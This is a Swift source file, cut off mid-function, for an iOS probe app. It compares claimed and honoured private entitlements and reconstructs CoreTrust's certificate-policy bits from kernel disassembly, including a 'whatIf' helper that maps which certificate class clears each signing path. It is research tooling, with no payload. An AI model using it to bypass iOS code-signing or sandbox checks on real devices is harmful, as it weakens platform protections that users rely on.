//
//  ProbeApp.swift
//  iOS private-entitlement probe — iOS 27.0.1 (24A446)
//
//  WHAT THIS IS
//  ------------
//  One app, one launch, one report.  It is written for a differential
//  experiment: the SAME binary is installed several times with different
//  (signature, profile) combinations, and every run appends its findings to
//  one file.  The analyzer (`scripts/verdict.py`) then collapses all runs into
//  a single table of verdicts, so the researcher reads one table instead of a
//  pile of dumps.
//
//  THE RULES THIS FILE ENCODES
//  ---------------------------
//  1. It never *asserts* a conclusion from a single observation.  Every
//     theory is evaluated against the facts actually collected in this run,
//     and is reported as CONFIRMED / REFUTED / CONSISTENT / INCONCLUSIVE /
//     NEEDS-LOG with the evidence line that produced the state.
//  2. A stored entitlement is not an honoured entitlement.  The report keeps
//     the CLAIMED set (what the CodeDirectory says) and the HONOURED set
//     (what SecTask returns) side by side, and the difference is the finding.
//  3. Every risky call is guarded and runs AFTER the report has been flushed,
//     so a trap cannot destroy the evidence.
//  4. Nothing is precomputed: the CT-policy table below is transcribed from
//     the CoreTrust disassembly, and the app recomputes the predicted policy
//     from the certificates it actually finds on the device.
//
//  THEORIES
//  --------
//  The contract lives in THEORIES.md.  Every theory id used there appears
//  below in `Theories.all`, and the ids are what the analyzer keys on.
//
//  Build:  ./scripts/build_ios.sh      (macOS, no Xcode project)
//  Scenarios: ./scripts/scenarios.sh   (macOS, needs your codesigning identity)
//  Collect:  ./scripts/collect.sh      (pulls the report off the device)
//  Verdict:  ./scripts/verdict.py reports/*.txt
//

import UIKit
import Security
import os
import ObjectiveC.runtime
import Darwin
import CryptoKit

// MARK: - Logging

final class ProbeLogger {
    static let shared = ProbeLogger()
    private let osLog = OSLog(subsystem: "com.research.ios27.privprobe", category: "probe")
    func log(_ m: String) { os_log("%{public}@", log: osLog, type: .info, m as NSString) }
}

// MARK: - Small helpers

enum Bits {
    /// The set bit positions of a 64-bit value.
    static func of(_ v: UInt64) -> [Int] {
        var out: [Int] = []
        var i = 0
        while i < 64 {
            if (v & (UInt64(1) << UInt64(i))) != 0 { out.append(i) }
            i += 1
        }
        return out
    }
    static func list(_ v: UInt64) -> String {
        let b = of(v)
        return b.isEmpty ? "-" : b.map { String($0) }.joined(separator: ",")
    }
    /// The same, for a list of bit numbers.
    static func list(_ bits: [Int]) -> String {
        bits.isEmpty ? "-" : bits.map { String($0) }.joined(separator: ",")
    }
    static func hex(_ v: UInt64) -> String { String(format: "0x%016llx", v) }
}

enum B64 {
    static func sha256(_ d: Data) -> String {
        SHA256.hash(data: d).map { String(format: "%02x", $0) }.joined()
    }
}

// MARK: - CT policy: OID -> bit
//
// Transcribed from agent A17's table (`ts27/notes/OID-POLICY.md`), which was
// extracted byte-for-byte from the CoreTrust kext's OID classifier
// `sub_fffffe0009bcc734` on iOS 27.0.1.  A17 supersedes the lead's earlier
// extraction, which had several wrong rows.
//
// Two entries are conditional in the kernel: the class is only granted when
// the extension's value is exactly 0x20 bytes long.  Those are marked.

enum CTPolicy {
    /// AMFI's acceptance mask: bits 7-16, 43, 44.
    static let acceptMask: UInt64 = 0x0000_1800_0001_ff80
    /// The App Store fast path additionally needs any ONE of bits 8, 12, 43.
    static let fastPathMask: UInt64 = 0x0000_0800_0000_1100
    /// The mask that guards the "Apple-internal profile" check (AMFI P12).
    static let internalProfileMask: UInt64 = 0x0000_1000_0001_ee80

    /// OID -> the BITS it contributes to the per-certificate accumulator.
    ///
    /// The bits are written as bit NUMBERS, not as a hex mask, on purpose: a
    /// hex mask of a high bit is easy to misalign by one nibble, and a
    /// misaligned mask silently moves a bit from 43 to 47.  `mask(for:)` is
    /// the only place a mask is ever built.
    static let oidBitNumbers: [String: [Int]] = [
        "1.2.840.113635.100.6.1.2":    [7],
        "1.2.840.113635.100.6.1.3":    [8],
        "1.2.840.113635.100.6.1.3.1":  [9],
        "1.2.840.113635.100.6.1.4":    [16],
        "1.2.840.113635.100.6.1.6":    [10],
        "1.2.840.113635.100.6.1.6.1":  [11],
        "1.2.840.113635.100.6.1.7":    [17],
        "1.2.840.113635.100.6.1.9":    [6],
        "1.2.840.113635.100.6.1.9.1":  [46],
        "1.2.840.113635.100.6.1.12":   [4],
        "1.2.840.113635.100.6.1.13":   [5],
        "1.2.840.113635.100.6.1.15":   [31],
        "1.2.840.113635.100.6.1.24":   [12],
        "1.2.840.113635.100.6.1.24.1": [13],
        "1.2.840.113635.100.6.1.25.1": [14],
        "1.2.840.113635.100.6.1.25.2": [15],
        "1.2.840.113635.100.6.1.32":   [37],
        "1.2.840.113635.100.6.1.34":   [38],
        "1.2.840.113635.100.6.1.36":   [43],
        "1.2.840.113635.100.6.1.36.1": [44],
        "1.2.840.113635.100.6.2.1":    [4, 6, 7, 12, 13, 14, 15, 16, 17, 37, 38, 43, 44, 46],
        "1.2.840.113635.100.6.2.6":    [5],
        "1.2.840.113635.100.6.2.14":   [22, 25, 48],
        "1.2.840.113635.100.6.2.17":   [26, 39],
        "1.2.840.113635.100.6.2.18":   [8, 9, 10, 11],
        "1.2.840.113635.100.6.2.20":   [20, 47],
        "1.2.840.113635.100.6.22":     [3, 20],
        "1.2.840.113635.100.6.22.1":   [47],
        "1.2.840.113635.100.6.29":     [25],
        "1.2.840.113635.100.6.64.3":   [22],
        "1.2.840.113635.100.6.71.1":   [34, 35],
        "1.2.840.113635.100.8.3":      [23, 42, 45],
        "1.2.840.113635.100.12.14":    [26],
        "1.2.840.113635.100.12.19":    [39],
    ]

    /// Build the mask for a list of bit numbers.
    static func mask(for bits: [Int]) -> UInt64 {
        var m: UInt64 = 0
        for b in bits where b >= 0 && b < 64 { m |= (UInt64(1) << UInt64(b)) }
        return m
    }

    /// OIDs whose bits are only granted when the extension's value is exactly
    /// 0x20 bytes long.
    static let valueLengthConditional: Set<String> = [
        "1.2.840.113635.100.8.3", "1.2.840.113635.100.6.71.1",
    ]

    /// The bits a single certificate earns, from its Apple OIDs.
    static func bits(forOIDs oids: [String]) -> (bits: UInt64, matched: [String]) {
        var b: UInt64 = 0
        var matched: [String] = []
        for o in oids {
            if let v = oidBitNumbers[o] {
                b |= mask(for: v)
                matched.append(o)
            }
        }
        return (b, matched)
    }

    /// What each certificate of the chain contributes.
    static func contributions(chain: [[String]]) -> [UInt64] {
        chain.map { bits(forOIDs: $0).bits }
    }

    /// The policy is the AND across the certificates that actually carry an
    /// Apple signing class.
    ///
    /// A certificate with **no** class — the anchor at the top of the chain —
    /// contributes the identity, not zero.  The device says so: our chain is
    /// leaf {7} -> intermediate {4,6,7,12..17,37,38,43,44,46} -> public root
    /// {}, and a strict AND over all three is **zero**, i.e. no chain could
    /// ever clear the gate.  The root must not participate.
    static func policy(chain: [[String]]) -> UInt64 {
        let c = contributions(chain: chain).filter { $0 != 0 }
        guard !c.isEmpty else { return 0 }
        return c.reduce(UInt64.max) { $0 & $1 }
    }

    /// The same AND with every certificate participating.  Reported for
    /// comparison: the difference between the two is the finding.
    static func strictPolicy(chain: [[String]]) -> UInt64 {
        let c = contributions(chain: chain)
        guard !c.isEmpty else { return 0 }
        return c.reduce(UInt64.max) { $0 & $1 }
    }

    /// What the policy would be if certificate `index` carried a different
    /// Apple class.  This is what turns the probe into a map of the target:
    /// it says exactly which certificate class is needed for which path.
    static func whatIf(chain: [[String]], index: Int, classOID: String) -> UInt64 {
        var c = contributions(chain: chain)
        guard index >= 0, index < c.count else { return 0 }
        c[index] = mask(for: oidBitNumbers[classOID] ?? [])
        let nz = c.filter { $0 != 0 }
        guard !nz.isEmpty else { return 0 }
        return nz.reduce(UInt64.max) { $0 & $1 }
    }

    /// Every Apple class the table knows, so the report can show what each of
    /// them would yield.
    static var knownClasses: [String] {
        oidBitNumbers.keys.filter { $0.hasPrefix("1.2.840.113635.100.6.1.") }
            .filter { !$0.contains(".1.") || $0.split(separator: ".").count <= 8 }
            .sorted()
    }
}

// MARK: - Report accumulator
//
// The report is APPENDED, so several installs of the same bundle identifier
// accumulate in one file instead of producing one dump per run.

final class Report {
    private(set) var lines: [String] = []
    private var written = 0
    private let path: String

    init() {
        let dir = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first
        path = (dir?.appendingPathComponent("probe-report.txt").path) ?? "/tmp/probe-report.txt"
    }

    /// Append only what is not on disk yet.  A true append, so the crash
    /// handler can add its own lines without the next flush moving them.
    func flush() {
        guard lines.count > written else { return }
        let chunk = lines[written...].joined(separator: "\n") + "\n"
        appendRaw(chunk)
        written = lines.count
    }

    private func appendRaw(_ s: String) {
        if let h = FileHandle(forWritingAtPath: path) {
            h.seekToEndOfFile()
            h.write(Data(s.utf8))
            try? h.close()
        } else {
            try? s.write(toFile: path, atomically: true, encoding: .utf8)
        }
    }

    /// Used by the crash handler: the exception has to survive the abort.
    func appendToDisk(_ line: String) { appendRaw(line + "\n") }

    func add(_ s: String) {
        lines.append(s)
        ProbeLogger.shared.log(s)
        flush()
    }
    func add(_ k: String, _ v: String) { add("\(k)=\(v)") }
    func section(_ s: String) { lines.append("--- \(s) ---"); flush() }
    var text: String { lines.joined(separator: "\n") + "\n" }
    var filePath: String { path }
}

/// An Objective-C exception raised inside a probe must not take the evidence
/// with it.  The handler writes the exception into the report and exits.
enum CrashGuard {
    /// The handler is a plain C function pointer, so it may not capture
    /// anything: the report is reached through a static instead.
    private static var current: Report?

    static func install(_ report: Report) {
        current = report
        NSSetUncaughtExceptionHandler { exception in
            let name = exception.name.rawValue
            let reason = exception.reason ?? "?"
            let stack = exception.callStackSymbols.joined(separator: " | ")
            CrashGuard.current?.appendToDisk("CRASH exception=\(name)")
            CrashGuard.current?.appendToDisk("CRASH reason=\(reason)")
            CrashGuard.current?.appendToDisk("CRASH stack=\(stack)")
            CrashGuard.current?.appendToDisk("=== end of run (crashed) ===")
            exit(70)
        }
    }
}

// MARK: - Dynamic Security.framework entry points
//
// SecTask, SecStaticCode and SecRequirement are not public API on iOS, so
// they are resolved at run time out of the shipped Security.framework.

enum DynSec {
    typealias CreateTask = @convention(c) (CFTypeRef?) -> Unmanaged<CFTypeRef>?
    typealias CopyEntitlement = @convention(c) (CFTypeRef, CFString, CFTypeRef?) -> CFTypeRef?
    typealias CreateStaticCode = @convention(c) (CFURL, CFTypeRef?, UnsafeMutablePointer<CFTypeRef?>) -> Int32
    typealias CreateRequirement = @convention(c) (CFString, CFTypeRef?, UnsafeMutablePointer<CFTypeRef?>) -> Int32
    typealias CheckValidity = @convention(c) (CFTypeRef, CFTypeRef?, CFTypeRef, UnsafeMutablePointer<Unmanaged<CFError>?>) -> Int32

    static let handle: UnsafeMutableRawPointer? = dlopen(
        "/System/Library/Frameworks/Security.framework/Security", RTLD_LAZY)

    static func sym(_ name: String) -> UnsafeMutableRawPointer? {
        guard let handle else { return nil }
        return dlsym(handle, name)
    }

    static let createTask: CreateTask? = {
        guard let s = sym("SecTaskCreateFromSelf") else { return nil }
        return unsafeBitCast(s, to: CreateTask.self)
    }()
    static let copyEntitlement: CopyEntitlement? = {
        guard let s = sym("SecTaskCopyValueForEntitlement") else { return nil }
        return unsafeBitCast(s, to: CopyEntitlement.self)
    }()
    static let createStaticCode: CreateStaticCode? = {
        guard let s = sym("SecStaticCodeCreateWithPath") else { return nil }
        return unsafeBitCast(s, to: CreateStaticCode.self)
    }()
    static let createRequirement: CreateRequirement? = {
        guard let s = sym("SecRequirementCreateWithString") else { return nil }
        return unsafeBitCast(s, to: CreateRequirement.self)
    }()
    static let checkValidity: CheckValidity? = {
        guard let s = sym("SecStaticCodeCheckValidity") else { return nil }
        return unsafeBitCast(s, to: CheckValidity.self)
    }()
    static let checkValidityWithErrors: (@convention(c) (CFTypeRef, CFTypeRef?, CFTypeRef, UnsafeMutablePointer<Unmanaged<CFError>?>) -> Int32)? = {
        guard let s = sym("SecStaticCodeCheckValidityWithErrors") else { return nil }
        return unsafeBitCast(s, to: (@convention(c) (CFTypeRef, CFTypeRef?, CFTypeRef, UnsafeMutablePointer<Unmanaged<CFError>?>) -> Int32).self)
    }()
}

// MARK: - DER helpers

enum DER {
    /// Decode every DER OID in a blob and return the ones in Apple's
    /// 1.2.840.113635.x space.
    static func appleOIDs(in der: Data) -> [String] {
        var out: [String] = []
        let bytes = [UInt8](der)
        var i = 0
        while i + 2 < bytes.count {
            guard bytes[i] == 0x06 else { i += 1; continue }
            var len = Int(bytes[i + 1])
            var start = i + 2
            if len & 0x80 != 0 {
                let n = len & 0x7f
                guard n > 0, n <= 4, start + n <= bytes.count else { i += 1; continue }
                len = 0
                for k in 0..<n { len = (len << 8) | Int(bytes[start + k]) }
                start += n
            }
            guard len > 0, len <= 32, start + len <= bytes.count else { i += 1; continue }
            let content = Array(bytes[start..<(start + len)])
            guard let first = content.first else { i += 1; continue }
            var parts = [String(first / 40), String(first % 40)]
            var v: UInt64 = 0
            for b in content.dropFirst() {
                v = (v << 7) | UInt64(b & 0x7f)
                if b & 0x80 == 0 { parts.append(String(v)); v = 0 }
            }
            let dotted = parts.joined(separator: ".")
            if dotted.hasPrefix("1.2.840.113635.") { out.append(dotted) }
            i = start + len
        }
        return out
    }

    /// Find every X.509 certificate embedded in a blob by scanning for the
    /// `SEQUENCE { SEQUENCE { ... } ... }` shape and asking Security.framework
    /// to parse each candidate.  This is how the real signing chain is
    /// recovered from the CMS blob of the running binary.
    static func certificates(in blob: Data) -> [Data] {
        let bytes = [UInt8](blob)
        var found: [Data] = []
        var i = 0
        while i + 4 < bytes.count {
            guard bytes[i] == 0x30 else { i += 1; continue }
            var total = 0
            var start = i + 1
            let first = Int(bytes[start])
            if first & 0x80 != 0 {
                let n = first & 0x7f
                guard n > 0, n <= 3, start + 1 + n <= bytes.count else { i += 1; continue }
                total = 0
                for k in 0..<n { total = (total << 8) | Int(bytes[start + 1 + k]) }
                start += 1 + n
            } else {
                total = first
            }
            let end = start + total
            guard total > 100, end <= bytes.count, start + 2 <= bytes.count else { i += 1; continue }
            guard bytes[start] == 0x30 else { i += 1; continue }
            let cand = Data(bytes[i..<end])
            let cf = cand.withUnsafeBytes { raw -> CFData? in
                CFDataCreate(nil, raw.baseAddress, CFIndex(cand.count))
            }
            if let cf = cf, SecCertificateCreateWithData(nil, cf) != nil {
                let h = B64.sha256(cand)
                if !found.contains(where: { B64.sha256($0) == h }) { found.append(cand) }
            }
            i = end
        }
        return found
    }
}

// MARK: - Mach-O / embedded signature reader

struct SliceInfo {
    var index: Int = 0
    var cputype: UInt32 = 0
    var cpusubtype: UInt32 = 0
    var identifier: String = ""
    var teamID: String = ""
    var codeDirectoryVersion: UInt32 = 0
    var execSegFlags: UInt64 = 0
    var claimedEntitlements: [String: String] = [:]
    var cdhash: String = ""
}

struct EmbeddedSignature {
    var isFat: Bool = false
    var slices: [SliceInfo] = []
    var superBlobOffset: Int = -1
    var slots: [(type: Int, offset: Int)] = []
    var codeDirectoryOffset: Int = -1
    var codeDirectoryVersion: UInt32 = 0
    var identifier: String = ""
    var teamID: String = ""
    var execSegFlags: UInt64 = 0
    var policyFieldCandidates: [(name: String, offset: Int, value: UInt64)] = []
    var cmsBlob: Data? = nil
    var entitlementsSlotPresent: Bool = false
    var entitlementsNote: String = ""
    var entitlementsHex: String = ""
    var adhoc: Bool = false
}

enum MachO {
    static let MH_MAGIC_64: UInt32 = 0xfeedfacf
    static let MH_CIGAM_64: UInt32 = 0xcffaedfe
    static let FAT_MAGIC: UInt32 = 0xcafebabe
    static let FAT_CIGAM: UInt32 = 0xbebafeca
    static let LC_CODE_SIGNATURE: UInt32 = 0x1d
    static let CSSLOT_ENTITLEMENTS: Int = 5
    static let CSSLOT_SIGNATURES: Int = 0x10000

    static func readU32(_ b: [UInt8], _ o: Int) -> UInt32 {
        guard o + 4 <= b.count else { return 0 }
        return UInt32(b[o]) | (UInt32(b[o + 1]) << 8) | (UInt32(b[o + 2]) << 16) | (UInt32(b[o + 3]) << 24)
    }
    static func readU32BE(_ b: [UInt8], _ o: Int) -> UInt32 {
        guard o + 4 <= b.count else { return 0 }
        return (UInt32(b[o]) << 24) | (UInt32(b[o + 1]) << 16) | (UInt32(b[o + 2]) << 8) | UInt32(b[o + 3])
    }
    static func readU64BE(_ b: [UInt8], _ o: Int) -> UInt64 {
        guard o + 8 <= b.count else { return 0 }
        var v: UInt64 = 0
        for i in (0..<8).reversed() { v = (v << 8) | UInt64(b[o + i]) }
        return v
    }
    static func readCString(_ b: [UInt8], _ o: Int) -> String {
        guard o < b.count else { return "" }
        var end = o
        while end < b.count && b[end] != 0 { end += 1 }
        return String(decoding: b[o..<end], as: UTF8.self)
    }

    /// Split a fat file into its slices; a thin file is a single slice.
    static func slices(of d: Data) -> [(cpu: UInt32, sub: UInt32, data: Data)] {
        let b = [UInt8](d)
        guard b.count > 8 else { return [] }
        let magic = readU32(b, 0)
        if magic == MH_MAGIC_64 || magic == MH_CIGAM_64 {
            return [(0x0100_000c, 0, d)]
        }
        guard magic == FAT_MAGIC || magic == FAT_CIGAM else { return [] }
        let big = (magic == FAT_MAGIC)
        let n = big ? Int(readU32BE(b, 4)) : Int(readU32(b, 4))
        var out: [(UInt32, UInt32, Data)] = []
        for i in 0..<min(n, 16) {
            let o = 8 + i * 20
            guard o + 20 <= b.count else { break }
            let cpu = big ? readU32BE(b, o) : readU32(b, o)
            let sub = big ? readU32BE(b, o + 4) : readU32(b, o + 4)
            let off = Int(big ? readU32BE(b, o + 8) : readU32(b, o + 8))
            let size = Int(big ? readU32BE(b, o + 12) : readU32(b, o + 12))
            guard off >= 0, size > 0, off + size <= b.count else { continue }
            out.append((cpu, sub, Data(b[off..<(off + size)])))
        }
        return out
    }

    /// Parse the embedded code signature of one slice.
    static func readSignature(slice: Data, index: Int) -> EmbeddedSignature? {
        let bytes = [UInt8](slice)
        guard bytes.count > 32 else { return nil }
        guard readU32(bytes, 0) == MH_MAGIC_64 else { return nil }
        let ncmds = Int(readU32(bytes, 16))
        var off = 32
        var sigOff = -1, sigSize = 0
        for _ in 0..<ncmds {
            guard off + 8 <= bytes.count else { return nil }
            let cmd = readU32(bytes, off)
            let cmdsize = Int(readU32(bytes, off + 4))
            if cmdsize < 8 { return nil }
            if cmd == LC_CODE_SIGNATURE {
                sigOff = Int(readU32(bytes, off + 8))
                sigSize = Int(readU32(bytes, off + 12))
            }
            off += cmdsize
        }
        guard sigOff >= 0, sigOff + sigSize <= bytes.count else { return nil }

        var sig = EmbeddedSignature()
        sig.superBlobOffset = sigOff

        let sb = sigOff
        guard sb + 12 <= bytes.count else { return nil }
        guard readU32BE(bytes, sb) == 0xfade0cc0 else { return nil }
        let count = Int(readU32BE(bytes, sb + 8))
        for i in 0..<min(count, 64) {
            let e = sb + 12 + i * 8
            guard e + 8 <= bytes.count else { break }
            sig.slots.append((type: Int(readU32BE(bytes, e)), offset: Int(readU32BE(bytes, e + 4))))
        }

        // CodeDirectory (slot 0)
        if let cdSlot = sig.slots.first(where: { $0.type == 0 }) {
            let cd = sb + cdSlot.offset
            guard cd + 0x60 <= bytes.count else { return sig }
            guard readU32BE(bytes, cd) == 0xfade0c02 else { return sig }
            sig.codeDirectoryOffset = cd
            sig.codeDirectoryVersion = readU32BE(bytes, cd + 8)
            let identOff = Int(readU32BE(bytes, cd + 20))
            if cd + identOff < bytes.count {
                sig.identifier = readCString(bytes, cd + identOff)
            }
            if sig.codeDirectoryVersion >= 0x20200, cd + 0x34 <= bytes.count {
                let teamOff = Int(readU32BE(bytes, cd + 0x30))
                if teamOff != 0, cd + teamOff < bytes.count {
                    sig.teamID = readCString(bytes, cd + teamOff)
                }
            }
            if sig.codeDirectoryVersion >= 0x20400, cd + 0x58 <= bytes.count {
                sig.execSegFlags = readU64BE(bytes, cd + 0x50)
            }
        }

        // The claimed entitlements live in slot 5.
        if let eSlot = sig.slots.first(where: { $0.type == CSSLOT_ENTITLEMENTS }) {
            sig.entitlementsSlotPresent = true
            let e = sb + eSlot.offset
            let blob = Data(bytes[e..<min(e + 4096, bytes.count)])
            let parsed = parseEntitlementsBlob(blob)
            sig.entitlementsNote = parsed.note
            sig.entitlementsHex = bytes[e..<min(e + 64, bytes.count)]
                .map { String(format: "%02x", $0) }.joined()
            sig.slices.append(SliceInfo(index: index,
                                        identifier: sig.identifier,
                                        teamID: sig.teamID,
                                        codeDirectoryVersion: sig.codeDirectoryVersion,
                                        execSegFlags: sig.execSegFlags,
                                        claimedEntitlements: parsed.dict))
        }

        // The CMS blob (slot 0x10000) — the real signed material.
        if let cSlot = sig.slots.first(where: { $0.type == CSSLOT_SIGNATURES }) {
            let c = sb + cSlot.offset
            // The CMS blob's length is in the BlobWrapper at c+4 (big endian).
            let len = Int(readU32BE(bytes, c + 4))
            let end = min(c + 8 + len, bytes.count)
            sig.cmsBlob = Data(bytes[c..<end])
            sig.adhoc = (len == 0)
        }

        // The CT-policy field candidates.  The kernel reads 8 bytes at +0xb8 of
        // a blob it has already verified; every plausible interpretation is
        // reported so the reader can line them up with the disassembly.
        sig.policyFieldCandidates.append(("superblob+0xb8", sb, readU64BE(bytes, sb + 0xb8)))
        if sig.codeDirectoryOffset >= 0 {
            let cd = sig.codeDirectoryOffset
            sig.policyFieldCandidates.append(("codedirectory+0x50 (execSegFlags)", cd, sig.execSegFlags))
            sig.policyFieldCandidates.append(("codedirectory+0xb8", cd, readU64BE(bytes, cd + 0xb8)))
        }
        if let cSlot = sig.slots.first(where: { $0.type == CSSLOT_SIGNATURES }) {
            let cms = sb + cSlot.offset
            sig.policyFieldCandidates.append(("cms+0xb8", cms, readU64BE(bytes, cms + 0xb8)))
            sig.policyFieldCandidates.append(("cms+0x8", cms, readU64BE(bytes, cms + 0x8)))
        }
        return sig
    }

    /// Parse a `0xfade7171` entitlements blob into a dictionary.
    ///
    /// The layout is:
    ///     uint32 magic  = 0xfade7171
    ///     uint32 length            (of the whole blob)
    ///     uint32 count
    ///     count * (uint32 keyOffset, uint32 valueOffset)   -- relative to the
    ///                                                          blob's start
    ///     the key/value strings
    ///
    /// The count is at offset **8**, not 4: offset 4 is the blob's length.
    /// Reading the count from the wrong place silently yields zero claimed
    /// entitlements, which is exactly how the first full run reported
    /// `claimed-count=0` while the signature clearly had an entitlements slot.
    static func parseEntitlementsBlob(_ d: Data) -> (dict: [String: String], note: String) {
        let b = [UInt8](d)
        guard b.count > 8 else { return ([:], "too short") }
        let magic = readU32BE(b, 0)
        let length = Int(readU32BE(b, 4))
        guard magic == 0xfade7171, length > 8, length <= b.count else {
            return ([:], String(format: "bad header magic=0x%08x len=%d", magic, length))
        }

        // ★ THE LAYOUT, FINALLY MEASURED ON THE DEVICE:
        //   uint32 magic  = 0xfade7171
        //   uint32 length = 413
        //   then the REST IS A RAW PLIST — XML here ("<?xml ..." = 3c 3f 78 6d).
        // It is NOT a (keyOffset, valueOffset) index table. Four runs were lost
        // to that assumption; the raw bytes in this report settled it.
        let payload = Data(b[8..<length])
        if let plist = try? PropertyListSerialization.propertyList(from: payload, options: [], format: nil),
           let dict = plist as? [String: Any] {
            var out: [String: String] = [:]
            for (k, v) in dict { out[k] = Ents.describe(v) }
            return (out, "plist keys=\(out.count) len=\(length)")
        }
        return ([:], "header ok but plist parse failed; head=" +
                payload.prefix(12).map { String(format: "%02x", $0) }.joined())
    }

    /// Read the whole signature of a file (thin or fat).
    static func readSignature(at path: String) -> (EmbeddedSignature, [SliceInfo]) {
        guard let data = FileManager.default.contents(atPath: path) else {
            return (EmbeddedSignature(), [])
        }
        let parts = slices(of: data)
        var merged = EmbeddedSignature()
        var infos: [SliceInfo] = []
        for (i, p) in parts.enumerated() {
            guard let s = readSignature(slice: p.data, index: i) else { continue }
            let info = SliceInfo(index: i, cputype: p.cpu, cpusubtype: p.sub,
                                 identifier: s.identifier, teamID: s.teamID,
                                 codeDirectoryVersion: s.codeDirectoryVersion,
                                 execSegFlags: s.execSegFlags,
                                 claimedEntitlements: s.slices.first?.claimedEntitlements ?? [:])
            infos.append(info)
            if i == 0 {
                merged = s
                merged.isFat = parts.count > 1
                merged.slices = []
            }
            if s.cmsBlob != nil && merged.cmsBlob == nil { merged.cmsBlob = s.cmsBlob }
            if s.entitlementsSlotPresent { merged.entitlementsSlotPresent = true }
            if s.adhoc { merged.adhoc = true }
            if merged.policyFieldCandidates.isEmpty { merged.policyFieldCandidates = s.policyFieldCandidates }
        }
        return (merged, infos)
    }
}

// MARK: - Entitlements (claimed vs honoured)

enum Ents {
    /// Control keys: what a normal app looks like.
    static let control: [String] = [
        "application-identifier",
        "com.apple.developer.team-identifier",
        "com.apple.security.application-groups",
        "get-task-allow",
        "keychain-access-groups",
        "com.apple.developer.icloud-container-identifiers",
    ]
    /// The private keys the research is about.
    static let privateKeys: [String] = [
        "com.apple.private.mobileinstall.allowedSPI",
        "com.apple.private.installcoordinationd.daemon",
        "com.apple.private.install.distributor-info-source",
        "com.apple.private.mobileinstall.allowed-linked-parents",
        "com.apple.private.security.no-sandbox",
        "com.apple.private.security.no-container",
        "com.apple.private.security.container-required",
        "com.apple.private.amfi.can-execute-cdhash",
        "com.apple.private.amfi.can-load-cdhash",
        "com.apple.private.oop-jit.loader",
    ]

    /// Every entitlement the kernel currently honours for this process.
    static func honoured() -> [String: String] {
        var out: [String: String] = [:]
        guard let create = DynSec.createTask, let copy = DynSec.copyEntitlement else { return out }
        guard let taskRef = create(nil) else { return out }
        let task = taskRef.takeUnretainedValue()
        for k in control + privateKeys {
            if let v = copy(task, k as CFString, nil) {
                out[k] = describe(v)
            }
        }
        return out
    }

    static func value(_ key: String) -> (present: Bool, description: String) {
        guard let create = DynSec.createTask, let copy = DynSec.copyEntitlement else {
            return (false, "symbols-unavailable")
        }
        guard let taskRef = create(nil) else { return (false, "no-task") }
        let task = taskRef.takeUnretainedValue()
        guard let v = copy(task, key as CFString, nil) else { return (false, "-") }
        return (true, describe(v))
    }

    /// Describe an arbitrary Objective-C value WITHOUT messaging it.
    ///
    /// `value as? String` is NOT safe on an arbitrary object: a conditional
    /// cast to a *bridged* Swift type makes the runtime send `length` to the
    /// object to see whether it is an NSString.  An NSDictionary has no
    /// `length`, so the cast raises NSInvalidArgumentException instead of
    /// returning nil — which is exactly how the first device run died:
    ///
    ///     -[__NSFrozenDictionaryM length]: unrecognized selector sent to
    ///     instance 0x138c1d720
    ///
    /// Every test below is an `is` check, which only reads the isa pointer,
    /// and the bridged conversion happens only after the class is known.
    static func describe(_ v: Any) -> String {
        if v is NSNull { return "null" }
        if v is NSDictionary {
            let d = v as! NSDictionary
            let keys = d.allKeys.map { String(describing: $0) }.sorted()
            return "dict(" + keys.joined(separator: ",") + ")"
        }
        if v is NSArray {
            let a = v as! NSArray
            return "[" + a.map { describe($0) }.joined(separator: ",") + "]"
        }
        if let n = v as? NSNumber { return n.boolValue ? "true" : "false" }
        if let s = v as? NSString { return s as String }
        return String(describing: type(of: v))
    }
}

// MARK: - libmis probe
//
// libmis is in the dyld shared cache at /usr/lib/libmis.dylib (574,848 bytes).
// It is the launch-time validator.  Calling it directly from the app answers
// two questions the static analysis could not:
//   * what does the launch-time validator say about THIS app?
//   * does libmis validate the provisioning profile's own signature?

enum Mis {
    typealias ValidateSignature = @convention(c) (CFString, CFTypeRef?) -> Int32
    typealias ValidateSignatureAndCopyInfo = @convention(c) (CFString, CFTypeRef?, UnsafeMutablePointer<CFTypeRef?>) -> Int32
    typealias ProfileCreateWithData = @convention(c) (CFTypeRef?, CFTypeRef?) -> Unmanaged<CFTypeRef>?
    typealias ProfileValidateSignature = @convention(c) (CFTypeRef?) -> Int32
    typealias ProfileCopyPayload = @convention(c) (CFTypeRef?) -> CFTypeRef?
    typealias ProfileGetValue = @convention(c) (CFTypeRef?, CFString) -> CFTypeRef?
    typealias ProfileIsDEREncoded = @convention(c) (CFTypeRef?) -> Bool
    typealias CopyErrorString = @convention(c) (Int32) -> CFTypeRef?

    static let handle: UnsafeMutableRawPointer? = dlopen("/usr/lib/libmis.dylib", RTLD_LAZY)

    static func sym(_ n: String) -> UnsafeMutableRawPointer? {
        guard let handle else { return nil }
        return dlsym(handle, n)
    }

    static let validateSignature: ValidateSignature? = {
        guard let s = sym("MISValidateSignature") else { return nil }
        return unsafeBitCast(s, to: ValidateSignature.self)
    }()
    static let validateAndCopyInfo: ValidateSignatureAndCopyInfo? = {
        guard let s = sym("MISValidateSignatureAndCopyInfo") else { return nil }
        return unsafeBitCast(s, to: ValidateSignatureAndCopyInfo.self)
    }()
    static let profileCreateWithData: ProfileCreateWithData? = {
        guard let s = sym("MISProfileCreateWithData") else { return nil }
        return unsafeBitCast(s, to: ProfileCreateWithData.self)
    }()
    static let profileValidateSignature: ProfileValidateSignature? = {
        guard let s = sym("MISProfileValidateSignature") else { return nil }
        return unsafeBitCast(s, to: ProfileValidateSignature.self)
    }()
    static let profileCopyPayload: ProfileCopyPayload? = {
        guard let s = sym("MISProfileCopyPayload") else { return nil }
        return unsafeBitCast(s, to: ProfileCopyPayload.self)
    }()
    static let profileGetValue: ProfileGetValue? = {
        guard let s = sym("MISProfileGetValue") else { return nil }
        return unsafeBitCast(s, to: ProfileGetValue.self)
    }()
    static let profileIsDEREncoded: ProfileIsDEREncoded? = {
        guard let s = sym("MISProfileIsDEREncoded") else { return nil }
        return unsafeBitCast(s, to: ProfileIsDEREncoded.self)
    }()
    static let copyErrorString: CopyErrorString? = {
        guard let s = sym("MISCopyErrorStringForErrorCode") else { return nil }
        return unsafeBitCast(s, to: CopyErrorString.self)
    }()

    static func errorText(_ code: Int32) -> String {
        guard let f = copyErrorString, let s = f(code) else {
            return String(format: "0x%08x", UInt32(bitPattern: code))
        }
        let ns = s as! NSString
        return ns as String
    }

    /// Dump the error-code -> text table around the MISError space.  The
    /// probe then decodes its own error codes instead of us guessing.
    static func errorTable() -> [Fact] {
        var out: [Fact] = []
        guard let f = copyErrorString else { return out }
        var found = 0
